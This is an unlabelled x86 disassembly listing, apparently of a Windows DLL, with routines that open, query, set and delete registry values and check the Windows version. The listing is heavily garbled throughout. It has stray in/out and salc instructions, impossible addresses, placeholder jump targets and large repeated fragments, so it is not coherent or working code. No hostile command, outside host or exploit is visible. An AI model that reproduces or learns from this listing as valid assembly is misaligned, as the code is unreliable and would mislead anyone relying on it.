push eax
lea eax [ ebp - 0x214 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
or eax 0x8b53f845
sub eax 0x5000e004
push eax
lea edx [ ebp - 0x414 ]
push eax
push ebx
push [ ebp + 0x8 ]
mov esi 0x200
mov [ ebp - 0x14 ] ebx
mov [ 0xfffffffffc7589f8 ] esi
cdq
pop ebp
in al 0xff
xlat
test ecx eax
jge r-xdata
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
leave
retn
sti
jne r-xdata
popad
lea eax [ ebp - 0x21c ]
push eax
lea eax [ ebp - 0x4040414 ]
push [ ebp - 0x10 ]
push ebx
push eax
push [ ebp + 0xc ]
call [ RegSetValueExA@IAT ]
lea eax [ ebp - 0x4 ]
inc [ ebp - 0xc ]
push eax
or eax 0xfffdec85
call [ eax - 0x73 ]
inc ebp
sub_10007dc0
push ebp
mov ebp esp
push ecx
push ebx
push esi
lea eax [ ebp - 0x4 ]
push edi
xor edi edi
jo r-xdata
push esi
push edi
add [ esi + rw-data ] edi
fist [ esi - 0x1 ]
jne r-xdata
add [ ebp - 0x10b7b ] cl
jg r-xdata
call sub_1000d2d6
mov ecx [ lstrcpyA@IAT ]
add eax esp
or al 0x8d
test esp esi
test eax eax
inc edx
lea eax [ ebp + 0x8 ]
ja r-xdata
xor ebx [ ebx - 0x1 ]
adc eax RegOpenKeyExA@IAT
sti
mov edi 0x84000001
push eax
push edi
call edi
test eax eax
jne r-xdata
push eax
leave
jge r-xdata
xor edi edi
push 0xff
lea eax [ ebp + 0x7ffffef4 ]
push edi
push edi
push 0x4002001f
push edi
push 0x3101076c
push edi
salc
push [ ebp + 0xc ]
std
adc eax 0x1004e044

mov esp [ ebp - 0xc ]
pop edi
pop esi
pop ebx
leave
retn
or eax 0x6850fc45
sbb [ eax ] eax
add al [ eax ]
push 0x0
out dx al
or [ gs : edi - 0x1 ] dl
salc
mov edi [ RegCloseKey@IAT ]
xchg eax eax
jne r-xdata
push [ ebp - 0x7 ]
call edi
push 0xff
lodsd [ esi ]
test ebp esi
sub_10007e02
xor eax RegCloseKey@IAT
test eax eax
jne r-xdata
push [ ebp - 0x4 ]
call esi
pop edi
mov eax [ ebx - 0x3c37e0b2 ]
push ebp
mov ebp esp
sub esp 0x20c
inc ebx
push esi
push edi
xor edi edi
push 0xff
lea eax [ ebp + 0x7ffffef4 ]
push edi
jmp [ ecx + 0x8 ]
add [ ebp - 0x10b7b ] cl
jg r-xdata
call sub_1000d2d6
mov ecx [ lstrcpyA@IAT ]
add eax esp
or al 0x8d
test esp esi
sti
mov edi 0x84000001
push eax
push edi
call edi
test eax eax
jne r-xdata
push eax
leave
jge r-xdata
mov esp [ ebp - 0xc ]
pop edi
pop esi
pop ebx
leave
retn
or eax 0x6850fc45
sbb [ eax ] eax
add al [ eax ]
push 0x0
out dx al
or [ gs : edi - 0x1 ] dl
salc
mov edi [ RegCloseKey@IAT ]
xchg eax eax
jne r-xdata
push [ ebp - 0x7 ]
call edi
push 0xff
lodsd [ esi ]
test ebp esi
sub_10007ed9
push eax
call memset
add esp 0xffffff8c
lea eax [ ebp - 0x20c ]
push rw-data
push eax
call ebx
lea eax [ ebp + 0x8 ]
xor ebx ebx
push eax
sub [ ecx ] bl
add [ edx ] al
add [ ebp - 0x20b7b ] cl
call [ edx + 0x50 ]
push [ ebp - 0x4 ]
call esi
test eax eax
jne r-xdata
push [ ebp - 0x14 ]
push [ ebp - 0x8 ]
push [ ebp + 0x18 ]
call sub_10006cdb
jg r-xdata
cmp al 0x0
add [ eax ] edx
push eax
call esi
lea eax [ ebp - 0x11c ]
push 0x14010260
push eax
call esi
mov edi [ 0x1100c03c ]
lea eax [ edi - 0x4 ]
push eax
push 0x20017
lea eax [ ebp - 0x1c ]
push ebx
push eax
push 0x80000003
call edi
test eax eax
jne r-xdata
clc
push [ ebp + 0x8 ]
call 0xf007dc0
add esp 0x10
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
leave
retn
mov [ ebp - 0x8011c ] es
push rw-data
push eax
call edi
add [ eax ] al
add bh bh
jne r-xdata
call edi
mov [ ebp + 0x8 ] ebx
mov [ ebp - 0x4 ] 0x1
lodsd [ esi ]
test esp esp
jle r-xdata
dec [ eax - 0x40 ]
add [ ecx ] eax
adc [ eax - 0x1 ] dl
salc
lea eax [ ebp - 0x8 ]
push eax
js r-xdata
std
jne r-xdata
les edx [ eax ]
out dx eax
xlat
mov [ ebp - 0x4 ] ebx
push [ ebp - 0x7 ]
call edi
mov esp [ ebp - 0xc ]
pop edi
pop esi
pop ebx
leave
retn
inc eax
loopne r-xdata
add [ edx ] al
add [ ebp - 0x511b7b ] cl
mov edi 0x3685053
add [ eax ] al
cmp dh 0xd7
test eax eax
jne r-xdata
adc [ eax + 0x53 ] dl
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
push ebx
push ebx
push rw-data
mov [ ebp - 0x10 ] ebx
push [ ebp - 0x8 ]
call edi
test eax eax
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edi [ RegQueryValueExA@IAT ]
push eax
push ebx
push [ ebp - 0x8 ]
call [ RegCloseKey@IAT ]
mov [ ebp - 0x8 ] ebx
push [ ebp - 0x10 ]
push 0x40
call [ LocalAlloc@IAT ]
mov esi eax
cmp esi ebx
mov [ ebp - 0x1c ] esi
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
push esi
push ebx
push ebx
push rw-data
push [ ebp - 0x8 ]
call edi
test eax eax
jne r-xdata
push esi
call [ LocalFree@IAT ]
mov eax [ esi + 0x8 ]
add esi 0x8
mov edi [ RegSetValueExA@IAT ]
add esi 0x4
mov [ ebp - 0xc ] eax
mov [ ebp - 0x14 ] ebx
mov eax [ esi ]
add esi 0x4
cmp eax ebx
mov [ ebp - 0x18 ] eax
je r-xdata
push rw-data
push [ ebp - 0x4 ]
call [ RegDeleteValueA@IAT ]
mov [ ebp - 0x14 ] ebx
push eax
push esi
push 0x1
push ebx
push rw-data
push [ ebp - 0x4 ]
call edi
test eax eax
jne r-xdata
push rw-data
push [ ebp - 0x4 ]
call [ RegDeleteValueA@IAT ]
push eax
push esi
push 0x1
push ebx
push rw-data
push [ ebp - 0x4 ]
call edi
jmp r-xdata
lea eax [ ebp - 0x14 ]
push 0x4
push eax
push 0x4
push ebx
push rw-data
push [ ebp - 0x4 ]
call edi
add esi [ ebp - 0x18 ]
mov eax [ esi ]
add esi 0x4
cmp eax ebx
mov [ ebp - 0x18 ] eax
je r-xdata
mov eax [ ebp - 0xc ]
shr eax 0x1
and eax 0x1
mov [ ebp - 0x14 ] eax
jmp r-xdata
push rw-data
push [ ebp - 0x4 ]
call [ RegDeleteValueA@IAT ]
test [ ebp - 0xc ] 0x4
je r-xdata
add esi [ ebp - 0x18 ]
mov eax [ esi ]
cmp eax ebx
je r-xdata
add esi 0x4
push eax
push esi
push 0x1
push ebx
push rw-data
push [ ebp - 0x4 ]
call edi
jmp r-xdata
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push 0x3
push ebx
push rw-data
push [ ebp - 0x8 ]
call edi
mov esi [ ebp - 0x1c ]
mov [ ebp - 0xc ] 0x1
sub_10007f49
push ebp
mov ebp esp
mov eax [ 0x50cac ]
inc esp
push ebx
push esi
push edi
xor ebx ebx
push 0x200000ef
or eax 0xdffee485
call [ ebx + 0x50 ]
lea ebx [ ebp - 0xc ]
call memset
add esp 0xffffff8c
lea eax [ ebp - 0x1019c ]
push rw-data
push eax
call [ lstrcpyA@IAT ]
mov esi [ r--data ]
lea eax [ ebp - 0x800011c ]
push rw-data
push eax
call esi
lea eax [ ebp - 0x11c ]
push 0x14010260
push eax
call esi
mov edi [ 0x1100c03c ]
lea eax [ edi - 0x4 ]
push eax
push 0x20017
lea eax [ ebp - 0x1c ]
push ebx
push eax
push 0x80000003
call edi
test eax eax
jne r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
leave
retn
mov [ ebp - 0x8011c ] es
push rw-data
push eax
call edi
lodsd [ esi ]
test esp esp
jle r-xdata
dec [ eax - 0x40 ]
add [ ecx ] eax
adc [ eax - 0x1 ] dl
salc
lea eax [ ebp - 0x8 ]
push eax
js r-xdata
inc eax
loopne r-xdata
add [ edx ] al
add [ ebp - 0x511b7b ] cl
mov edi 0x3685053
add [ eax ] al
cmp dh 0xd7
test eax eax
jne r-xdata
adc [ eax + 0x53 ] dl
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
push ebx
push ebx
push rw-data
mov [ ebp - 0x10 ] ebx
push [ ebp - 0x8 ]
call edi
test eax eax
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edi [ RegQueryValueExA@IAT ]
push eax
push ebx
push [ ebp - 0x8 ]
call [ RegCloseKey@IAT ]
mov [ ebp - 0x8 ] ebx
push [ ebp - 0x10 ]
push 0x40
call [ LocalAlloc@IAT ]
mov esi eax
cmp esi ebx
mov [ ebp - 0x1c ] esi
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
push esi
push ebx
push ebx
push rw-data
push [ ebp - 0x8 ]
call edi
test eax eax
jne r-xdata
push esi
call [ LocalFree@IAT ]
mov eax [ esi + 0x8 ]
add esi 0x8
mov edi [ RegSetValueExA@IAT ]
add esi 0x4
mov [ ebp - 0xc ] eax
mov [ ebp - 0x14 ] ebx
mov eax [ esi ]
add esi 0x4
cmp eax ebx
mov [ ebp - 0x18 ] eax
je r-xdata
push rw-data
push [ ebp - 0x4 ]
call [ RegDeleteValueA@IAT ]
mov [ ebp - 0x14 ] ebx
push eax
push esi
push 0x1
push ebx
push rw-data
push [ ebp - 0x4 ]
call edi
test eax eax
jne r-xdata
push rw-data
push [ ebp - 0x4 ]
call [ RegDeleteValueA@IAT ]
push eax
push esi
push 0x1
push ebx
push rw-data
push [ ebp - 0x4 ]
call edi
jmp r-xdata
lea eax [ ebp - 0x14 ]
push 0x4
push eax
push 0x4
push ebx
push rw-data
push [ ebp - 0x4 ]
call edi
add esi [ ebp - 0x18 ]
mov eax [ esi ]
add esi 0x4
cmp eax ebx
mov [ ebp - 0x18 ] eax
je r-xdata
mov eax [ ebp - 0xc ]
shr eax 0x1
and eax 0x1
mov [ ebp - 0x14 ] eax
jmp r-xdata
push rw-data
push [ ebp - 0x4 ]
call [ RegDeleteValueA@IAT ]
test [ ebp - 0xc ] 0x4
je r-xdata
add esi [ ebp - 0x18 ]
mov eax [ esi ]
cmp eax ebx
je r-xdata
add esi 0x4
push eax
push esi
push 0x1
push ebx
push rw-data
push [ ebp - 0x4 ]
call edi
jmp r-xdata
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push 0x3
push ebx
push rw-data
push [ ebp - 0x8 ]
call edi
mov esi [ ebp - 0x1c ]
mov [ ebp - 0xc ] 0x1
sub_1000815d
push ebp
mov ebp esp
sub esp 0x108
push ebx
push esi
push edi
xor ebx ebx
push 0xff
lea eax [ ebp - 0x108 ]
push ebx
push eax
mov [ ebp - 0x4 ] ebx
call memset
add esp 0xc
lea eax [ ebp - 0x108 ]
push rw-data
push eax
call [ lstrcpyA@IAT ]
mov esi [ lstrcatA@IAT ]
mov edi rw-data
lea eax [ ebp - 0x108 ]
push edi
push eax
call esi
lea eax [ ebp - 0x108 ]
push rw-data
push eax
call esi
lea eax [ ebp - 0x108 ]
push edi
push eax
call esi
lea eax [ ebp - 0x108 ]
push rw-data
push eax
call esi
lea eax [ ebp - 0x8 ]
push eax
push 0x2001f
lea eax [ ebp - 0x108 ]
push ebx
push eax
push 0x80000003
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
push ebx
push ebx
push ebx
push ebx
push rw-data
push [ ebp - 0x8 ]
call [ RegQueryValueExA@IAT ]
test eax eax
jne r-xdata
push [ ebp - 0x8 ]
call [ RegCloseKey@IAT ]
mov [ ebp - 0x4 ] 0x1
sub_1000821e
cmp [ rw-data ] 0x1
je r-xdata
retn
push rw-data
call sub_100075fc
mov [ esp ] rw-data
call sub_100075fc
mov [ esp ] rw-data
call sub_100075fc
mov [ esp ] rw-data
call sub_100075fc
mov [ esp ] rw-data
call sub_100075fc
mov [ esp ] rw-data
call sub_100075fc
mov [ esp ] rw-data
call sub_100075fc
mov [ esp ] rw-data
call sub_100075fc
mov [ esp ] rw-data
call sub_100075fc
mov [ esp ] rw-data
call sub_100075fc
mov [ esp ] rw-data
call sub_100075fc
mov [ esp ] rw-data
call sub_100075fc
mov [ esp ] rw-data
call sub_100075ee
pop ecx
mov [ rw-data ] 0x1
sub_100082ce
push ebp
mov ebp esp
sub esp 0xb0
mov eax [ ebp + 0xc ]
push esi
test eax eax
jne r-xdata
mov esi [ ebp + 0x8 ]
and [ eax ] 0x0
cmp esi 0xa
jae r-xdata
push 0x57
jmp r-xdata
push ebx
push edi
push 0x14
lea eax [ ebp - 0x14 ]
pop edi
push edi
push 0x0
push eax
call memset
add esp 0xc
mov [ ebp - 0x14 ] esi
call [ GetVersion@IAT ]
mov ebx eax
mov [ ebp + 0x8 ] 0xffffffbe
movzx eax bl
sub eax 0x4
je r-xdata
push 0xffffffe6
pop eax
jmp r-xdata
call sub_1000c680
test al al
je r-xdata
dec eax
je r-xdata
pop esi
leave
retn
lea eax [ ebp - 0x14 ]
push edi
push eax
push sub_1000840e
mov [ ebp + 0x8 ] 0xffffffe2
jmp r-xdata
mov esi 0x9c
lea eax [ ebp - 0xb0 ]
push esi
push 0x0
push eax
call memset
add esp 0xc
lea eax [ ebp - 0xb0 ]
mov [ ebp - 0xb0 ] esi
push eax
call [ GetVersionExA@IAT ]
xor eax eax
mov al bh
movzx eax al
sub eax 0x0
je r-xdata
dec eax
jne r-xdata
mov eax [ ebp + 0x8 ]
pop edi
pop ebx
push edi
call [ malloc@IAT ]
mov esi eax
pop ecx
test esi esi
je r-xdata
lea eax [ ebp - 0x14 ]
push edi
push eax
push sub_100084f5
jmp r-xdata
dec eax
je r-xdata
lea eax [ ebp - 0x14 ]
push edi
push eax
push sub_100089de
jmp r-xdata
lea eax [ ebp - 0x14 ]
push edi
push eax
push esi
call memcpy
mov eax [ ebp + 0xc ]
add esp 0xc
mov [ eax ] esi
call sub_100096ce
add esp 0xc
mov [ ebp + 0x8 ] eax
test eax eax
jne r-xdata
cmp [ ebp - 0x1c ] 0x2
lea eax [ ebp - 0x14 ]
push edi
push eax
jae r-xdata
dec eax
jne r-xdata
push sub_10008732
jmp r-xdata
push sub_100085dc
jmp r-xdata
cmp [ ebp - 0x1c ] 0x0
lea eax [ ebp - 0x14 ]
push edi
push eax
je r-xdata
push sub_10008888
jmp r-xdata
sub_1000840e
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x20
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov esi [ ebp + 0xc ]
xor edi edi
cmp esi edi
je r-xdata
push 0x57
cmp [ ebp + 0x10 ] 0x14
jne r-xdata
mov [ esi + 0x8 ] edi
mov [ esi + 0x4 ] edi
mov [ ebp - 0x20 ] 0xffffffe3
mov [ ebp - 0x4 ] edi
push [ esi ]
push [ ebp + 0x8 ]
call sub_100099aa
pop ecx
pop ecx
mov [ ebp - 0x24 ] eax
cmp eax edi
jne r-xdata
mov ecx [ eax + 0x108 ]
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x28 ] edi
mov edx 0x220
or [ ebp - 0x4 ] 0xffffffff
push 0xffffffec
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x20 ]
jmp r-xdata
mov eax [ ecx + 0x48 ]
mov eax [ eax + edi * 8 ]
mov [ ebp - 0x2c ] eax
cmp [ eax + 0x1 ] 0x2
jb r-xdata
pop eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp edi 0x3e8
ja r-xdata
cmp [ eax + 0x8 ] 0x20
jne r-xdata
inc edi
mov [ ebp - 0x28 ] edi
jmp r-xdata
add eax 0xc
mov ebx [ eax ]
and ebx 0xff0
cmp ebx edx
jne r-xdata
cmp edi [ ecx + 0x30 ]
jae r-xdata
mov [ esi + 0x4 ] eax
mov ebx [ eax ]
mov [ esi + 0x8 ] ebx
mov [ eax ] edx
and [ ebp - 0x20 ] 0x0
sub_100084f5
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x20
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov esi [ ebp + 0xc ]
xor edi edi
cmp esi edi
je r-xdata
push 0x57
cmp [ ebp + 0x10 ] 0x14
jne r-xdata
mov [ esi + 0x8 ] edi
mov [ esi + 0x4 ] edi
mov [ ebp - 0x20 ] 0xffffffe3
mov [ ebp - 0x4 ] edi
push [ esi ]
push [ ebp + 0x8 ]
call sub_100099aa
pop ecx
pop ecx
mov [ ebp - 0x24 ] eax
cmp eax edi
jne r-xdata
mov ecx [ eax + 0x12c ]
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x28 ] edi
mov edx 0x220
or [ ebp - 0x4 ] 0xffffffff
push 0xffffffec
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x20 ]
jmp r-xdata
mov eax [ ecx + 0x58 ]
mov eax [ eax + edi * 8 ]
mov [ ebp - 0x2c ] eax
cmp [ eax + 0x1 ] 0x2
jb r-xdata
pop eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp edi 0x3e8
ja r-xdata
cmp [ eax + 0x8 ] 0x20
jne r-xdata
inc edi
mov [ ebp - 0x28 ] edi
jmp r-xdata
add eax 0xc
mov ebx [ eax ]
and ebx 0xff0
cmp ebx edx
jne r-xdata
cmp edi [ ecx + 0x3c ]
jae r-xdata
mov [ esi + 0x4 ] eax
mov ebx [ eax ]
mov [ esi + 0x8 ] ebx
mov [ eax ] edx
and [ ebp - 0x20 ] 0x0
sub_100085dc
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x2c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
je r-xdata
push 0x57
pop eax
cmp [ ebp + 0x10 ] 0x14
jne r-xdata
mov [ esi + 0x8 ] ebx
mov [ esi + 0x4 ] ebx
mov [ ebp - 0x20 ] 0xffffffe3
mov [ ebp - 0x4 ] ebx
push [ esi ]
push [ ebp + 0x8 ]
call sub_100099aa
pop ecx
pop ecx
mov [ ebp - 0x24 ] eax
cmp eax ebx
jne r-xdata
push rw-data
push [ ebp + 0x8 ]
call sub_10009b69
mov [ ebp - 0x2c ] eax
push rw-data
push [ ebp + 0x8 ]
call sub_10009b69
add esp 0x10
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x2c ] ebx
je r-xdata
push 0xffffffec
jmp r-xdata
push 0xffffffe0
jmp r-xdata
cmp eax ebx
je r-xdata
pop eax
or [ ebp - 0x4 ] 0xffffffff
jmp sub_10008723
push [ ebp - 0x24 ]
call [ ebp - 0x2c ]
mov [ ebp - 0x30 ] eax
cmp eax ebx
jne r-xdata
mov [ ebp - 0x4 ] 0x1
mov edi eax
mov [ ebp - 0x3c ] edi
xor edx edx
mov [ ebp - 0x34 ] edx
mov ecx 0x220
push 0xffffffe1
and [ ebp - 0x4 ] 0x0
call sub_100086f3
jmp r-xdata
mov eax [ edi + 0x5c ]
mov eax [ eax + edx * 8 ]
mov [ ebp - 0x38 ] eax
cmp [ eax + 0x1 ] 0x2
jb r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x20 ]
jmp sub_10008723
cmp edx 0x3e8
ja r-xdata
cmp [ eax + 0x8 ] 0x20
jne r-xdata
inc edx
mov [ ebp - 0x34 ] edx
jmp r-xdata
add eax 0xc
mov ebx [ eax ]
and ebx 0xff0
cmp ebx ecx
jne r-xdata
cmp edx [ edi + 0x40 ]
jae r-xdata
mov [ esi + 0x4 ] eax
mov ebx [ eax ]
mov [ esi + 0x8 ] ebx
mov [ eax ] ecx
and [ ebp - 0x20 ] 0x0
sub_10008732
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x2c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
je r-xdata
push 0x57
pop eax
cmp [ ebp + 0x10 ] 0x14
jne r-xdata
mov [ esi + 0x8 ] ebx
mov [ esi + 0x4 ] ebx
mov [ ebp - 0x20 ] 0xffffffe3
mov [ ebp - 0x4 ] ebx
push [ esi ]
push [ ebp + 0x8 ]
call sub_100099aa
pop ecx
pop ecx
mov [ ebp - 0x24 ] eax
cmp eax ebx
jne r-xdata
push rw-data
push [ ebp + 0x8 ]
call sub_10009b69
mov [ ebp - 0x2c ] eax
push rw-data
push [ ebp + 0x8 ]
call sub_10009b69
add esp 0x10
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x2c ] ebx
je r-xdata
push 0xffffffec
jmp r-xdata
push 0xffffffe0
jmp r-xdata
cmp eax ebx
je r-xdata
pop eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push [ ebp - 0x24 ]
call [ ebp - 0x2c ]
mov [ ebp - 0x30 ] eax
cmp eax ebx
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov [ ebp - 0x4 ] 0x1
mov edi eax
mov [ ebp - 0x3c ] edi
xor edx edx
mov [ ebp - 0x34 ] edx
mov ecx 0x220
push 0xffffffe1
and [ ebp - 0x4 ] 0x0
call sub_10008849
jmp r-xdata
mov eax [ edi + 0x68 ]
mov eax [ eax + edx * 8 ]
mov [ ebp - 0x38 ] eax
cmp [ eax + 0x1 ] 0x2
jb r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x20 ]
jmp r-xdata
cmp edx 0x3e8
ja r-xdata
cmp [ eax + 0x8 ] 0x20
jne r-xdata
inc edx
mov [ ebp - 0x34 ] edx
jmp r-xdata
add eax 0xc
mov ebx [ eax ]
and ebx 0xff0
cmp ebx ecx
jne r-xdata
cmp edx [ edi + 0x4c ]
jae r-xdata
mov [ esi + 0x4 ] eax
mov ebx [ eax ]
mov [ esi + 0x8 ] ebx
mov [ eax ] ecx
and [ ebp - 0x20 ] 0x0
sub_10008888
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x2c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
je r-xdata
push 0x57
pop eax
cmp [ ebp + 0x10 ] 0x14
jne r-xdata
mov [ esi + 0x8 ] ebx
mov [ esi + 0x4 ] ebx
mov [ ebp - 0x20 ] 0xffffffe3
mov [ ebp - 0x4 ] ebx
push [ esi ]
push [ ebp + 0x8 ]
call sub_100099aa
pop ecx
pop ecx
mov [ ebp - 0x24 ] eax
cmp eax ebx
jne r-xdata
push rw-data
push [ ebp + 0x8 ]
call sub_10009b69
mov [ ebp - 0x2c ] eax
push rw-data
push [ ebp + 0x8 ]
call sub_10009b69
add esp 0x10
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x2c ] ebx
je r-xdata
push 0xffffffec
jmp r-xdata
push 0xffffffe0
jmp r-xdata
cmp eax ebx
je r-xdata
pop eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push [ ebp - 0x24 ]
call [ ebp - 0x2c ]
mov [ ebp - 0x30 ] eax
cmp eax ebx
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov [ ebp - 0x4 ] 0x1
mov edi eax
mov [ ebp - 0x3c ] edi
xor edx edx
mov [ ebp - 0x34 ] edx
mov ecx 0x220
push 0xffffffe1
and [ ebp - 0x4 ] 0x0
call sub_1000899f
jmp r-xdata
mov eax [ edi + 0x68 ]
mov eax [ eax + edx * 8 ]
mov [ ebp - 0x38 ] eax
cmp [ eax + 0x1 ] 0x2
jb r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x20 ]
jmp r-xdata
cmp edx 0x3e8
ja r-xdata
cmp [ eax + 0x8 ] 0x20
jne r-xdata
inc edx
mov [ ebp - 0x34 ] edx
jmp r-xdata
add eax 0xc
mov ebx [ eax ]
and ebx 0xff0
cmp ebx ecx
jne r-xdata
cmp edx [ edi + 0x4c ]
jae r-xdata
mov [ esi + 0x4 ] eax
mov ebx [ eax ]
mov [ esi + 0x8 ] ebx
mov [ eax ] ecx
and [ ebp - 0x20 ] 0x0
sub_100089de
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x34
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
je r-xdata
push 0x57
cmp [ ebp + 0x10 ] 0x14
jne r-xdata
mov [ esi + 0x8 ] ebx
mov [ esi + 0x4 ] ebx
mov [ esi + 0x10 ] ebx
mov [ esi + 0xc ] ebx
mov [ ebp - 0x20 ] 0xffffffe3
mov [ ebp - 0x4 ] ebx
push [ esi ]
push [ ebp + 0x8 ]
call sub_100099aa
pop ecx
pop ecx
mov [ ebp - 0x24 ] eax
cmp eax ebx
jne r-xdata
push rw-data
push [ ebp + 0x8 ]
call sub_10009b69
mov [ ebp - 0x2c ] eax
push rw-data
push [ ebp + 0x8 ]
call sub_10009b69
add esp 0x10
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x2c ] ebx
je r-xdata
push 0xffffffec
jmp r-xdata
push 0xffffffe0
jmp r-xdata
cmp eax ebx
je r-xdata
pop eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push [ ebp - 0x24 ]
call [ ebp - 0x2c ]
mov [ ebp - 0x30 ] eax
cmp eax ebx
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov [ ebp - 0x4 ] 0x1
mov edi eax
mov [ ebp - 0x38 ] edi
xor edx edx
push 0xffffffe1
cmp [ ebp - 0x20 ] ebx
je r-xdata
mov eax edx
shl eax 0x3
mov ecx [ edi + 0x90 ]
mov ecx [ eax + ecx ]
mov [ ebp - 0x3c ] ecx
cmp [ ecx + 0x1 ] 0x2
jb r-xdata
push rw-data
push [ ebp + 0x8 ]
call sub_10009b69
pop ecx
pop ecx
mov [ ebp - 0x44 ] eax
cmp eax ebx
jne r-xdata
xor edx edx
inc edx
jmp r-xdata
cmp [ ecx + 0x8 ] 0x20
jne r-xdata
lea ecx [ edi + 0xd0 ]
push ecx
push [ edi + 0x78 ]
push [ edi + 0x90 ]
call eax
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
call _local_unwind2
pop ecx
pop ecx
push 0xffffffe0
jmp r-xdata
cmp [ ebp - 0x20 ] ebx
jne r-xdata
mov eax edx
shl eax 0x3
mov ecx [ edi + 0x90 ]
mov ecx [ eax + ecx ]
mov [ ebp - 0x40 ] ecx
cmp [ ecx + 0x1 ] 0x2
jb r-xdata
mov [ ebp - 0x34 ] edx
cmp edx [ edi + 0x78 ]
jae r-xdata
add ecx 0xc
cmp [ ecx ] 0x220
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x20 ]
jmp r-xdata
pop eax
mov [ ebp - 0x4 ] ebx
call sub_10008bec
jmp r-xdata
cmp edx 0x3e8
ja r-xdata
cmp [ ecx + 0x8 ] 0x20
jne r-xdata
mov [ esi + 0x4 ] ecx
mov ecx [ ecx ]
mov [ esi + 0x8 ] ecx
mov ecx [ edi + 0x90 ]
lea ecx [ eax + ecx + 0x4 ]
mov [ esi + 0xc ] ecx
mov ecx [ edi + 0x90 ]
mov ecx [ eax + ecx + 0x4 ]
mov [ esi + 0x10 ] ecx
mov ecx [ edi + 0x90 ]
mov [ eax + ecx + 0x4 ] 0x7
mov [ ebp - 0x20 ] ebx
inc edx
jmp r-xdata
add ecx 0xc
mov ebx [ ecx ]
and ebx 0xff0
cmp ebx 0x220
jne r-xdata
mov [ ebp - 0x34 ] edx
cmp edx [ edi + 0x78 ]
jae r-xdata
xor ebx ebx
mov [ esi + 0x4 ] ecx
mov edx [ ecx ]
mov [ esi + 0x8 ] edx
mov edx [ edi + 0x90 ]
lea edx [ eax + edx + 0x4 ]
mov [ esi + 0xc ] edx
mov edx [ edi + 0x90 ]
mov edx [ eax + edx + 0x4 ]
mov [ esi + 0x10 ] edx
mov [ ecx ] ebx
mov ecx [ edi + 0x90 ]
mov [ eax + ecx + 0x4 ] 0x7
xor ebx ebx
mov [ ebp - 0x20 ] ebx
jmp r-xdata
sub_10008c2b
push ebp
mov ebp esp
sub esp 0xb4
mov eax [ ebp + 0x1c ]
test eax eax
je r-xdata
push esi
mov esi [ ebp + 0x8 ]
cmp esi 0xa
jae r-xdata
and [ eax ] 0x0
push ebx
push edi
push 0x18
lea eax [ ebp - 0x18 ]
push 0x0
push eax
call memset
mov eax [ ebp + 0xc ]
add esp 0xc
mov [ ebp - 0x14 ] eax
